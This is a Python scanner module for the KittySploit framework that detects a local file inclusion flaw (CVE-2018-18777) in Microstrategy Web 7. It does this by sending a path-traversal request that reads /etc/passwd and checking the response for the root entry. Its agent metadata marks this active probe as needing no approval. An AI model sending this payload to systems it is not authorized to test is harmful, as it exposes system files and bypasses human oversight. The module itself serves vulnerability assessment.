#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Microstrategy Web 7 is vulnerable to local file inclusion via "/WebMstr7/servlet/mstrWeb" (in the parameter su."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Microstrategy Web 7 - Local File Inclusion Detection',
        'description': 'Microstrategy Web 7 is vulnerable to local file inclusion via "/WebMstr7/servlet/mstrWeb" (in the parameter subpage). Remote authenticated users can bypass intended SecurityManager restrictions and list a parent directory via a /.. (slash dot dot) in a pathname used by a web application. NOTE: this is a deprecated product.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'traversal', 'edb', 'packetstorm', 'microstrategy', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/45755',
            'http://packetstormsecurity.com/files/150059/Microstrategy-Web-7-Cross-Site-Scripting-Traversal.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-18777',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-18777',
    }

    def run(self):
        r = self.http_request(method="GET", path='/WebMstr7/servlet/mstrWeb?evt=3045&src=mstrWeb.3045&subpage=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Microstrategy Web 7 - Local File Inclusion detected",
                path='/WebMstr7/servlet/mstrWeb?evt=3045&src=mstrWeb.3045&subpage=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
            )
            return True
        return False

